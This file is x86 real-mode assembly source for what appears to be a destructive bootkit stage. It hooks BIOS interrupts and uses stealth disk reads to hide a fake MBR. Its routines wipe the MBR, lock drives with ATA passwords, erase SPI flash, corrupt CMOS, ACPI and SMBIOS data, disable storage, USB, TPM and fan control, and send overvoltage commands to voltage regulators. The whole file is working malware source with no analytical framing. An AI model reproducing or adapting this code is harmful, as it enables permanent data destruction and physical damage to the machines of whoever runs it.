[BITS 16]
[ORG 0x2000]

dw 0xBEEF
dw 0xDEAD

start_stage2:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x2000
    sti

    mov ax, [es:0x0472]
    mov [warm_boot_flag], ax

    mov ax, [es:13h*4]
    mov [old_int13_seg], ax
    mov ax, [es:13h*4+2]
    mov [old_int13_seg+2], ax

    mov ax, [es:15h*4]
    mov [old_int15_seg], ax
    mov ax, [es:15h*4+2]
    mov [old_int15_seg+2], ax

    mov ax, [es:09h*4]
    mov [old_int09_seg], ax
    mov ax, [es:09h*4+2]
    mov [old_int09_seg+2], ax

    mov ax, [es:16h*4]
    mov [old_int16_seg], ax
    mov ax, [es:16h*4+2]
    mov [old_int16_seg+2], ax

    mov ax, [es:1Ch*4]
    mov [old_int1c_seg], ax
    mov ax, [es:1Ch*4+2]
    mov [old_int1c_seg+2], ax

    mov ax, [es:08h*4]
    mov [old_int08_seg], ax
    mov ax, [es:08h*4+2]
    mov [old_int08_seg+2], ax

    cli
    mov word [es:13h*4], new_int13
    mov [es:13h*4+2], cs
    mov word [es:15h*4], new_int15
    mov [es:15h*4+2], cs
    mov word [es:09h*4], new_int09
    mov [es:09h*4+2], cs
    mov word [es:16h*4], new_int16
    mov [es:16h*4+2], cs
    mov word [es:1Ch*4], new_int1c
    mov [es:1Ch*4+2], cs
    mov word [es:08h*4], new_int08
    mov [es:08h*4+2], cs
    sti

    call check_boot_guard
    call check_s3_resume
    call disable_watchdog
    call kill_microcode_update
    call kill_legacy_usb_emulation
    call msr_lockdown
    call pcie_link_disable_all

    call phase1_cmos
    call phase2_acpi
    call phase3_chipset
    call phase4_pci
    call phase5_storage_kill
    call phase6_usb
    call phase7_video
    call phase8_audio
    call phase9_option_rom
    call phase10_disk_mbr
    call phase11_smm
    call phase12_vrm_ovp_attack
    call phase13_smbios
    call phase14_lan_rom
    call phase15_hda_dsp
    call phase16_super_io_kill
    call phase17_fan_control_kill
    call phase18_tpm_kill
    call phase19_memory_remap_kill
    call phase20_spi_unlock

    call load_stage3
    cmp al, 0x00
    jne skip_stage3
    jmp 0x0000:0x4000

skip_stage3:
infinite_halt:
    cli
    hlt
    jmp infinite_halt

load_stage3:
    pusha
    mov ah, 0x02
    mov al, 0x20
    xor bx, bx
    mov es, bx
    mov bx, 0x4000
    mov cx, 0x0022
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    jc load3_fail
    cmp ah, 0x00
    jne load3_fail
    push es
    mov ax, 0x4000
    mov es, ax
    cmp word [es:0x0000], 0xBEEF
    jne load3_fail_pop
    cmp word [es:0x0002], 0xCAFE
    jne load3_fail_pop
    pop es
    mov al, 0x00
    mov [load3_status], al
    jmp load3_done
load3_fail_pop:
    pop es
load3_fail:
    mov al, 0x01
    mov [load3_status], al
load3_done:
    popa
    mov al, [load3_status]
    ret

check_boot_guard:
    pusha
    mov ecx, 0x0000013A
    rdmsr
    test eax, 0x00000001
    jz bg_not_enforced
    mov [boot_guard_status], byte 0x01
    jmp bg_done
bg_not_enforced:
    mov [boot_guard_status], byte 0x00
bg_done:
    popa
    ret

check_s3_resume:
    pusha
    mov al, 0x0F
    out 0x70, al
    in al, 0x71
    cmp al, 0x05
    jne not_s3
    call phase1_cmos
    call phase10_disk_mbr
    call phase2_acpi
not_s3:
    popa
    ret

disable_watchdog:
    pusha
    mov dx, 0x0CF8
    mov eax, 0x8000FA00
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp ax, 0xFFFF
    je wd_done
    mov dx, 0x0CF8
    mov eax, 0x8000FA04
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    and eax, 0xFFFF0000
    cmp eax, 0x00000000
    je wd_done
    add eax, 0x0060
    mov dx, ax
    add dx, 0x0008
    in eax, dx
    and eax, 0xFFFFFFFD
    out dx, eax
    mov dx, ax
    sub dx, 0x0008
    mov eax, 0x00000000
    out dx, eax
wd_done:
    popa
    ret

kill_microcode_update:
    pusha
    mov ecx, 0x0000008B
    xor edx, edx
    xor eax, eax
    wrmsr
    popa
    ret

kill_legacy_usb_emulation:
    pusha
    mov al, 0x2D
    out 0x70, al
    in al, 0x71
    or al, 0xC0
    out 0x71, al
    mov al, 0x2E
    out 0x70, al
    in al, 0x71
    or al, 0xC0
    out 0x71, al
    popa
    ret

msr_lockdown:
    pusha
    mov ecx, 0x0000003A
    rdmsr
    or eax, 0x00000001
    wrmsr
    mov ecx, 0x00000C80
    rdmsr
    or eax, 0x80000000
    wrmsr
    mov ecx, 0x000001A0
    mov edx, 0x000000FF
    mov eax, 0xFFFFFFFF
    wrmsr
    popa
    ret

pcie_link_disable_all:
    pusha
    mov cx, 0x0000
pcie_link_loop:
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000000
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp ax, 0xFFFF
    je pcie_link_next
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000050
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp al, 0x10
    jne pcie_link_next
    add dl, 0x08
    in eax, dx
    and eax, 0xFFFFFFF0
    out dx, eax
pcie_link_next:
    inc cx
    cmp cx, 0x0100
    jne pcie_link_loop
    popa
    ret

phase1_cmos:
    pusha
    xor cx, cx
cmos_fry:
    mov al, cl
    out 0x70, al
    mov al, 0xFF
    out 0x71, al
    inc cx
    cmp cx, 128
    jne cmos_fry
    mov al, 0x38
    out 0x70, al
    mov al, 0xFF
    out 0x71, al
    mov al, 0x39
    out 0x70, al
    mov al, 0xFF
    out 0x71, al
    mov al, 0x3A
    out 0x70, al
    mov al, 0xFF
    out 0x71, al
    mov al, 0x3B
    out 0x70, al
    mov al, 0xFF
    out 0x71, al
    mov al, 0x3C
    out 0x70, al
    mov al, 0xFF
    out 0x71, al
    mov al, 0x3D
    out 0x70, al
    mov al, 0xFF
    out 0x71, al
    mov al, 0x3E
    out 0x70, al
    mov al, 0xFF
    out 0x71, al
    mov al, 0x3F
    out 0x70, al
    mov al, 0xFF
    out 0x71, al
    mov cx, 5000
cmos_hammer:
    mov al, 0x2E
    out 0x70, al
    mov al, 0xFF
    out 0x71, al
    mov al, 0x2F
    out 0x70, al
    mov al, 0xFF
    out 0x71, al
    mov al, 0x10
    out 0x70, al
    in al, 0x71
    xor al, 0xFF
    out 0x71, al
    mov al, 0x11
    out 0x70, al
    in al, 0x71
    xor al, 0xFF
    out 0x71, al
    mov al, 0x12
    out 0x70, al
    mov al, 0x00
    out 0x71, al
    mov al, 0x14
    out 0x70, al
    mov al, 0x00
    out 0x71, al
    loop cmos_hammer
    popa
    ret

phase2_acpi:
    pusha
    xor ax, ax
    mov es, ax
    mov di, 0x0000
    mov cx, 0x0400
acpi_scan:
    push cx
    mov eax, [es:di]
    cmp eax, 0x20445352
    je acpi_found
    cmp eax, 0x20525453
    je acpi_found
    add di, 16
    pop cx
    loop acpi_scan
    jmp acpi_exit
acpi_found:
    pop cx
    mov eax, [es:di+16]
    mov [rsdt_addr], eax
    test eax, eax
    jz acpi_exit
    mov esi, eax
    mov eax, [es:esi+4]
    sub eax, 36
    shr eax, 2
    mov cx, ax
    add esi, 36
acpi_kill_loop:
    mov eax, [es:esi]
    mov ebx, [es:eax]
    cmp ebx, 0x50434641
    je acpi_kill
    cmp ebx, 0x54445353
    je acpi_kill
    cmp ebx, 0x4349504D
    je acpi_kill
    cmp ebx, 0x54455048
    je acpi_kill
    cmp ebx, 0x54434542
    je acpi_kill
    cmp ebx, 0x54444742
    je acpi_kill
    cmp ebx, 0x5441444D
    je acpi_kill
    cmp ebx, 0x54435352
    je acpi_kill
    cmp ebx, 0x54494C53
    je acpi_kill
    cmp ebx, 0x54434657
    je acpi_kill
    cmp ebx, 0x54434557
    je acpi_kill
    cmp ebx, 0x5444504D
    je acpi_kill
    cmp ebx, 0x54434944
    je acpi_kill
    jmp acpi_skip
acpi_kill:
    mov byte [es:eax], 0x00
    mov byte [es:eax+1], 0x00
    mov byte [es:eax+2], 0x00
    mov byte [es:eax+3], 0x00
acpi_skip:
    add esi, 4
    loop acpi_kill_loop
acpi_exit:
    popa
    ret

phase3_chipset:
    pusha
    mov eax, 0x80000000
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp eax, 0xFFFFFFFF
    je chipset_done
    mov eax, 0x8000FA00
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    mov [chipset_lpc_id], eax
    call me_hmrfpo_attack
    call spi_flash_erase
    call rtc_power_cycle
    call gpio_attack
chipset_done:
    popa
    ret

me_hmrfpo_attack:
    pusha
    mov eax, 0x8000F000
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp ax, 0xFFFF
    je me_exit
    mov eax, 0x8000F004
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp eax, 0x00000000
    je me_exit
    mov [mei_bar], eax
    mov dx, [mei_bar]
    add dx, 0x0004
    mov eax, 0x00000000
    out dx, eax
    mov dx, [mei_bar]
    add dx, 0x0008
    mov eax, 0x00000000
    out dx, eax
    mov dx, [mei_bar]
    add dx, 0x000C
    mov eax, 0x00000000
    out dx, eax
    mov cx, 1000
me_wait_rdy:
    mov dx, [mei_bar]
    add dx, 0x0004
    in eax, dx
    test eax, 0x00000002
    jnz me_send_cmd
    loop me_wait_rdy
    jmp me_exit
me_send_cmd:
    mov di, me_buffer
    mov dword [di], 0x48505246
    mov dword [di+4], 0x504F5F4D
    mov dword [di+8], 0x45524154
    mov dword [di+12], 0x00000000
    mov dword [di+16], 0x00000000
    mov dword [di+20], 0x00000000
    mov dword [di+24], 0x00000000
    mov dx, [mei_bar]
    mov eax, me_buffer
    out dx, eax
    mov dx, [mei_bar]
    add dx, 0x0004
    mov eax, 0x0000001C
    or eax, 0x80000000
    out dx, eax
    mov cx, 2000
me_wait_done:
    mov dx, [mei_bar]
    add dx, 0x0004
    in eax, dx
    test eax, 0x00000004
    jnz me_exit
    loop me_wait_done
me_exit:
    popa
    ret

spi_flash_erase:
    pusha
    mov eax, 0x8000F800
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp eax, 0xFFFFFFFF
    je spi_exit
    mov [rcba], eax
    add eax, 0x3800
    mov [spi_bar], eax
    mov dx, [spi_bar]
    in eax, dx
    mov [spi_bfpr], eax
    mov dx, [spi_bar]
    mov eax, 0x00000000
    out dx, eax
    mov dx, [spi_bar]
    add dx, 0x0050
    mov eax, 0x00000000
    out dx, eax
    mov dx, [spi_bar]
    add dx, 0x0054
    mov eax, 0x00000000
    out dx, eax
    mov dx, [spi_bar]
    add dx, 0x0058
    mov eax, 0x00000001
    out dx, eax
    mov dx, [spi_bar]
    add dx, 0x0090
    in eax, dx
    or eax, 0x00000001
    out dx, eax
    mov cx, 1000
spi_wait:
    mov dx, [spi_bar]
    add dx, 0x0090
    in eax, dx
    test eax, 0x00000001
    jz spi_done
    loop spi_wait
spi_done:
    mov dx, [spi_bar]
    mov eax, [spi_bfpr]
    out dx, eax
spi_exit:
    popa
    ret

rtc_power_cycle:
    pusha
    mov al, 0x0B
    out 0x70, al
    in al, 0x71
    and al, 0x7F
    out 0x71, al
    mov cx, 0xFFFF
rtc_delay:
    nop
    loop rtc_delay
    mov al, 0x0B
    out 0x70, al
    in al, 0x71
    or al, 0x80
    out 0x71, al
    popa
    ret

gpio_attack:
    pusha
    mov dx, 0x0A00
    mov al, 0xFF
    out dx, al
    mov dx, 0x0A04
    mov al, 0x00
    out dx, al
    mov dx, 0x0A08
    mov al, 0xFF
    out dx, al
    popa
    ret

phase4_pci:
    pusha
    mov cx, 0x0000
pci_attack_loop:
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000000
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp ax, 0xFFFF
    je pci_next
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000004
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    mov eax, 0x00000000
    out dx, eax
    mov eax, ecx
    shl eax, 8
    or eax, 0x8000003C
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    mov eax, 0x00000000
    out dx, eax
    mov eax, ecx
    shl eax, 8
    or eax, 0x8000000C
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    mov eax, 0x00000000
    out dx, eax
pci_next:
    inc cx
    cmp cx, 0x0100
    jne pci_attack_loop
    popa
    ret

phase5_storage_kill:
    pusha
    mov cx, 0x0000
storage_scan:
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000000
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp ax, 0xFFFF
    je storage_next
    shr eax, 16
    cmp ax, 0x0106
    je kill_ahci
    cmp ax, 0x0101
    je kill_ide
    cmp ax, 0x0108
    je kill_nvme
    cmp ax, 0x0104
    je kill_raid
    jmp storage_next
kill_ahci:
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000004
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    and eax, 0xFFFF0000
    jz storage_next
    mov dx, ax
    mov eax, 0x00000000
    out dx, eax
    add dx, 0x0004
    mov eax, 0x00000000
    out dx, eax
    add dx, 0x0004
    mov eax, 0x00000000
    out dx, eax
    add dx, 0x0004
    mov eax, 0xFFFFFFFF
    out dx, eax
    jmp storage_next
kill_ide:
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000004
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    mov eax, 0xFFFFFFFF
    out dx, eax
    jmp storage_next
kill_nvme:
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000004
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    and eax, 0xFFFFFFF0
    jz storage_next
    mov [nvme_bar], eax
    mov dx, [nvme_bar]
    add dx, 0x0014
    mov eax, 0x00000000
    out dx, eax
    mov dx, [nvme_bar]
    add dx, 0x0024
    mov eax, 0xFFFFFFFF
    out dx, eax
    mov dx, [nvme_bar]
    add dx, 0x0028
    mov eax, 0xFFFFFFFF
    out dx, eax
    jmp storage_next
kill_raid:
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000004
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    mov eax, 0x00000000
    out dx, eax
    jmp storage_next
storage_next:
    inc cx
    cmp cx, 0x0100
    jne storage_scan

    mov dl, 0x80
ata_lock_loop:
    push dx
    mov ah, 0x08
    int 0x13
    pop dx
    jc ata_next
    push dx
    mov dx, 0x01F6
    mov al, 0xA0
    out dx, al
    mov dx, 0x01F7
ata_wait_bsy:
    in al, dx
    test al, 0x80
    jnz ata_wait_bsy
    test al, 0x01
    jnz ata_next_pop
    mov dx, 0x01F7
    mov al, 0xF1
    out dx, al
    mov dx, 0x01F2
    mov al, 0x01
    out dx, al
    mov dx, 0x01F3
    mov al, 0x00
    out dx, al
    mov dx, 0x01F4
    mov al, 0x00
    out dx, al
    mov dx, 0x01F5
    mov al, 0x01
    out dx, al
    mov dx, 0x01F7
ata_wait_drq:
    in al, dx
    test al, 0x08
    jz ata_wait_drq
    mov dx, 0x01F0
    mov cx, 16
ata_send_pw:
    mov ax, 0xFFFF
    out dx, ax
    add dx, 2
    loop ata_send_pw
    mov dx, 0x01F7
    mov al, 0x92
    out dx, al
    mov dx, 0x01F2
    mov al, 0x01
    out dx, al
    mov dx, 0x01F3
    mov al, 0x01
    out dx, al
    mov dx, 0x01F4
    mov al, 0x00
    out dx, al
    mov dx, 0x01F5
    mov al, 0x00
    out dx, al
    mov dx, 0x01F7
    mov al, 0xF4
    out dx, al
ata_next_pop:
    pop dx
ata_next:
    inc dl
    cmp dl, 0x84
    jne ata_lock_loop

    mov dl, 0x80
hdd_park_loop:
    push dx
    mov ah, 0x08
    int 0x13
    pop dx
    jc hdd_next
    mov cx, 100
park_head:
    push cx
    push dx
    mov dx, 0x01F6
    mov al, 0xA0
    out dx, al
    mov dx, 0x01F7
    mov al, 0x94
    out dx, al
    mov dx, 0x01F2
    mov al, 0x01
    out dx, al
    mov dx, 0x01F3
    mov al, 0x00
    out dx, al
    mov dx, 0x01F4
    mov al, 0x00
    out dx, al
    mov dx, 0x01F5
    mov al, 0x00
    out dx, al
    mov dx, 0x01F7
    mov al, 0x30
    out dx, al
    mov dx, 0x01F7
park_wait:
    in al, dx
    test al, 0x80
    jnz park_wait
    mov dx, 0x01F7
    mov al, 0x91
    out dx, al
    mov dx, 0x01F7
    mov al, 0xE7
    out dx, al
    mov dx, 0x01F7
    mov al, 0x50
    out dx, al
    pop dx
    pop cx
    loop park_head
hdd_next:
    inc dl
    cmp dl, 0x84
    jne hdd_park_loop
    popa
    ret

phase6_usb:
    pusha
    mov cx, 0x0000
usb_scan:
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000000
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp ax, 0xFFFF
    je usb_next
    shr eax, 16
    cmp ax, 0x0C03
    je kill_usb
    cmp ax, 0x0C00
    je kill_usb
    jmp usb_next
kill_usb:
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000004
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    mov eax, 0x00000000
    out dx, eax
usb_next:
    inc cx
    cmp cx, 0x0100
    jne usb_scan
    popa
    ret

phase7_video:
    pusha
    mov dx, 0x03C2
    mov al, 0xE7
    out dx, al
    mov dx, 0x03C4
    mov al, 0x01
    out dx, al
    inc dx
    mov al, 0x00
    out dx, al
    mov dx, 0x03CE
    mov al, 0x05
    out dx, al
    inc dx
    mov al, 0x00
    out dx, al
    mov dx, 0x03D4
    mov cx, 2000
vga_hamm:
    mov al, 0x0E
    out dx, al
    inc dx
    mov al, 0xFF
    out dx, al
    dec dx
    mov al, 0x0F
    out dx, al
    inc dx
    mov al, 0xFF
    out dx, al
    dec dx
    mov al, 0x11
    out dx, al
    inc dx
    mov al, 0x00
    out dx, al
    dec dx
    loop vga_hamm
    mov ax, 0x4F00
    mov di, vbe_buf
    int 0x10
    mov ax, 0xA000
    mov es, ax
    xor di, di
    mov cx, 32000
vram_fry:
    mov al, 0xFF
    stosb
    mov al, 0x00
    stosb
    mov al, 0xAA
    stosb
    mov al, 0x55
    stosb
    loop vram_fry
    mov dx, 0x03C0
    mov al, 0x10
    out dx, al
    mov al, 0x00
    out dx, al
    mov dx, 0x03C0
    mov al, 0x13
    out dx, al
    mov al, 0x00
    out dx, al
    popa
    ret

phase8_audio:
    pusha
    in al, 0x61
    or al, 0x03
    out 0x61, al
    mov al, 0xB6
    out 0x43, al
    mov al, 0xFF
    out 0x42, al
    mov al, 0xFF
    out 0x42, al
    mov cx, 10000
spk_burn:
    in al, 0x61
    or al, 0x03
    out 0x61, al
    mov al, 0xFF
    out 0x42, al
    in al, 0x61
    and al, 0xFC
    out 0x61, al
    loop spk_burn
    mov cx, 0x0000
hda_scan:
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000000
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp ax, 0xFFFF
    je hda_next
    shr eax, 16
    cmp ax, 0x0403
    jne hda_next
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000004
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    mov eax, 0x00000000
    out dx, eax
hda_next:
    inc cx
    cmp cx, 0x0100
    jne hda_scan
    popa
    ret

phase9_option_rom:
    pusha
    mov ax, 0xC000
    mov es, ax
rom_scan:
    cmp ax, 0xE000
    je rom_done
    cmp word [es:0x0000], 0xAA55
    jne rom_next
    mov byte [es:0x0002], 0x01
    mov word [es:0x0003], 0x9090
rom_next:
    add ax, 0x0080
    jmp rom_scan
rom_done:
    popa
    ret

phase10_disk_mbr:
    pusha
    mov dl, 0x80
mbr_kill_loop:
    push dx
    mov ah, 0x08
    int 0x13
    pop dx
    jc mbr_next
    push dx
    mov ah, 0x03
    mov al, 0x01
    xor bx, bx
    mov es, bx
    mov bx, zerobuf
    xor cx, cx
    mov dh, 0x00
    int 0x13
    int 0x13
    int 0x13
    int 0x13
    int 0x13
    pop dx
    push dx
    mov ah, 0x03
    mov al, 0x01
    xor bx, bx
    mov es, bx
    mov bx, zerobuf
    mov cx, 0x0002
    mov dh, 0x00
    int 0x13
    int 0x13
    int 0x13
    pop dx
    push dx
    mov ah, 0x03
    mov al, 0x01
    xor bx, bx
    mov es, bx
    mov bx, zerobuf
    mov cx, 0x0001
    mov dh, 0x01
    int 0x13
    int 0x13
    int 0x13
    pop dx
    push dx
    mov ah, 0x03
    mov al, 0x08
    xor bx, bx
    mov es, bx
    mov bx, zerobuf
    mov cx, 0x0001
    mov dh, 0x00
    int 0x13
    pop dx
mbr_next:
    inc dl
    cmp dl, 0x84
    jne mbr_kill_loop
    popa
    ret

phase11_smm:
    pusha
    mov al, 0x00
    out 0xB2, al
    mov al, 0xFF
    out 0xB3, al
    mov ecx, 0x00000176
    xor edx, edx
    mov eax, 0x00010000
    wrmsr
    mov ecx, 0x000001A0
    mov edx, 0x000000FF
    mov eax, 0xFFFFFFFF
    wrmsr
    popa
    ret

phase12_vrm_ovp_attack:
    pusha
    mov eax, 0x8000FA00
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    mov [smbus_lpc_id], ax
    mov eax, 0x8000FA04
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    and eax, 0xFFFF0000
    mov [smbus_bar], eax
    cmp eax, 0x00000000
    je vrm_done
    mov dx, [smbus_bar]
    add dx, 0x0000
    in al, dx
    or al, 0x01
    out dx, al
    mov si, vrm_addrs
    mov cx, 8
vrm_scan_loop:
    push cx
    lodsb
    mov [vrm_cur_addr], al
    mov dx, [smbus_bar]
    add dx, 0x0004
    mov al, [vrm_cur_addr]
    out dx, al
    mov dx, [smbus_bar]
    add dx, 0x0003
    mov al, 0x00
    out dx, al
    mov dx, [smbus_bar]
    add dx, 0x0002
    mov al, 0x00
    out dx, al
    mov cx, 500
vrm_wait1:
    mov dx, [smbus_bar]
    in al, dx
    test al, 0x02
    jnz vrm_send_vid
    loop vrm_wait1
    jmp vrm_next
vrm_send_vid:
    mov dx, [smbus_bar]
    add dx, 0x0002
    mov al, 0x00
    out dx, al
    mov dx, [smbus_bar]
    add dx, 0x0003
    mov al, 0x01
    out dx, al
    mov dx, [smbus_bar]
    add dx, 0x0002
    mov al, 0xFF
    out dx, al
    mov cx, 500
vrm_wait2:
    mov dx, [smbus_bar]
    in al, dx
    test al, 0x02
    jnz vrm_next
    loop vrm_wait2
vrm_next:
    pop cx
    loop vrm_scan_loop
    mov dx, [smbus_bar]
    add dx, 0x0004
    mov al, 0x40
    out dx, al
    mov dx, [smbus_bar]
    add dx, 0x0003
    mov al, 0x02
    out dx, al
    mov dx, [smbus_bar]
    add dx, 0x0002
    mov al, 0xFF
    out dx, al
    mov cx, 500
vrm_wait3:
    mov dx, [smbus_bar]
    in al, dx
    test al, 0x02
    jnz vrm_kill_ovp
    loop vrm_wait3
    jmp vrm_done
vrm_kill_ovp:
    mov dx, [smbus_bar]
    add dx, 0x0004
    mov al, 0x40
    out dx, al
    mov dx, [smbus_bar]
    add dx, 0x0003
    mov al, 0x04
    out dx, al
    mov dx, [smbus_bar]
    add dx, 0x0002
    mov al, 0x01
    out dx, al
    mov cx, 500
vrm_wait4:
    mov dx, [smbus_bar]
    in al, dx
    test al, 0x02
    jnz vrm_done
    loop vrm_wait4
vrm_done:
    popa
    ret

phase13_smbios:
    pusha
    xor ax, ax
    mov es, ax
    mov di, 0xF0000
    mov cx, 0x10000
smbios_scan:
    cmp dword [es:di], 0x5F534D5F
    je smbios_found
    inc di
    loop smbios_scan
    jmp smbios_done
smbios_found:
    mov eax, [es:di+8]
    mov [smbios_entry], eax
    mov esi, eax
    mov cx, 256
smbios_kill_loop:
    cmp byte [es:esi], 0x00
    je smbios_kill_type
    cmp byte [es:esi], 0x01
    je smbios_kill_type
    cmp byte [es:esi], 0x02
    je smbios_kill_type
smbios_next_type:
    add esi, 2
smbios_skip_strings:
    cmp byte [es:esi], 0x00
    jne smbios_skip_inc
    cmp byte [es:esi+1], 0x00
    je smbios_next_entry
smbios_skip_inc:
    inc esi
    jmp smbios_skip_strings
smbios_next_entry:
    inc esi
    loop smbios_kill_loop
    jmp smbios_done
smbios_kill_type:
    mov dword [es:esi], 0x00000000
    mov dword [es:esi+4], 0x00000000
    jmp smbios_next_type
smbios_done:
    popa
    ret

phase14_lan_rom:
    pusha
    mov ax, 0xC000
    mov es, ax
lan_rom_scan:
    cmp ax, 0xE000
    je lan_rom_done
    cmp word [es:0x0000], 0xAA55
    jne lan_rom_next
    cmp byte [es:0x0002], 0x01
    jne lan_rom_next
    mov word [es:0x0003], 0x9090
lan_rom_next:
    add ax, 0x0080
    jmp lan_rom_scan
lan_rom_done:
    popa
    ret

phase15_hda_dsp:
    pusha
    mov cx, 0x0000
dsp_scan:
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000000
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp ax, 0xFFFF
    je dsp_next
    shr eax, 16
    cmp ax, 0x0403
    jne dsp_next
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000004
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    and eax, 0xFFFFFFC0
    jz dsp_next
    mov dx, ax
    add dx, 0x0060
    mov eax, 0xFFFFFFFF
    out dx, eax
    add dx, 0x0004
    mov eax, 0xFFFFFFFF
    out dx, eax
    add dx, 0x0004
    mov eax, 0xFFFFFFFF
    out dx, eax
    add dx, 0x0004
    mov eax, 0x00000000
    out dx, eax
dsp_next:
    inc cx
    cmp cx, 0x0100
    jne dsp_scan
    popa
    ret

phase16_super_io_kill:
    pusha
    mov dx, 0x002E
    mov al, 0x87
    out dx, al
    out dx, al
    mov al, 0x07
    out dx, al
    mov dx, 0x002F
    mov al, 0x08
    out dx, al
    mov dx, 0x002E
    mov al, 0x30
    out dx, al
    mov dx, 0x002F
    mov al, 0x00
    out dx, al
    mov dx, 0x002E
    mov al, 0x60
    out dx, al
    mov dx, 0x002F
    mov al, 0x00
    out dx, al
    mov dx, 0x002E
    mov al, 0x61
    out dx, al
    mov dx, 0x002F
    mov al, 0x00
    out dx, al
    mov dx, 0x002E
    mov al, 0xAA
    out dx, al
    popa
    ret

phase17_fan_control_kill:
    pusha
    mov dx, 0x002E
    mov al, 0x87
    out dx, al
    out dx, al
    mov al, 0x07
    out dx, al
    mov dx, 0x002F
    mov al, 0x08
    out dx, al
    mov dx, 0x002E
    mov al, 0x04
    out dx, al
    mov dx, 0x002F
    in al, dx
    and al, 0xF0
    out dx, al
    mov dx, 0x002E
    mov al, 0xAA
    out dx, al
    popa
    ret

phase18_tpm_kill:
    pusha
    mov cx, 0x0000
tpm_scan:
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000000
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp ax, 0xFFFF
    je tpm_next
    shr eax, 16
    cmp ax, 0x9797
    je kill_tpm
    cmp ax, 0x0001
    je kill_tpm
    jmp tpm_next
kill_tpm:
    mov eax, ecx
    shl eax, 8
    or eax, 0x80000004
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    mov eax, 0x00000000
    out dx, eax
tpm_next:
    inc cx
    cmp cx, 0x0100
    jne tpm_scan
    popa
    ret

phase19_memory_remap_kill:
    pusha
    mov eax, 0x8000FA00
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp ax, 0xFFFF
    je mem_remap_done
    mov eax, 0x8000FA04
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    and eax, 0xFFFF0000
    cmp eax, 0x00000000
    je mem_remap_done
    add eax, 0x0098
    mov dx, ax
    in eax, dx
    and eax, 0xFFFFFFFE
    out dx, eax
mem_remap_done:
    popa
    ret

phase20_spi_unlock:
    pusha
    mov eax, 0x8000FA00
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    cmp ax, 0xFFFF
    je spi_unlock_done
    mov eax, 0x8000FA04
    mov dx, 0x0CF8
    out dx, eax
    mov dx, 0x0CFC
    in eax, dx
    and eax, 0xFFFF0000
    cmp eax, 0x00000000
    je spi_unlock_done
    add eax, 0x30DC
    mov dx, ax
    in eax, dx
    or eax, 0x00000001
    out dx, eax
    sub dx, 0x0004
    in eax, dx
    and eax, 0xFFFFFFF0
    or eax, 0x00000000
    out dx, eax
spi_unlock_done:
    popa
    ret

new_int13:
    pushf
    cmp ah, 0x02
    je stealth_read
    cmp ah, 0x03
    je block_write
    cmp ah, 0x42
    je stealth_read_ext
    cmp ah, 0x43
    je block_write
    cmp ah, 0x08
    je fake_geom
    popf
    jmp far [cs:old_int13_seg]
stealth_read:
    cmp dl, 0x80
    jb pass_int13
    cmp dl, 0x84
    ja pass_int13
    cmp cx, 0x0001
    jne pass_int13
    cmp dh, 0x00
    jne pass_int13
    popf
    pusha
    push es
    xor ax, ax
    mov es, ax
    mov di, 0x7E00
    mov cx, 512
    push cs
    pop ds
    mov si, fake_mbr
    cld
    rep movsb
    pop es
    popa
    clc
    mov ah, 0x00
    retf 2
pass_int13:
    popf
    jmp far [cs:old_int13_seg]
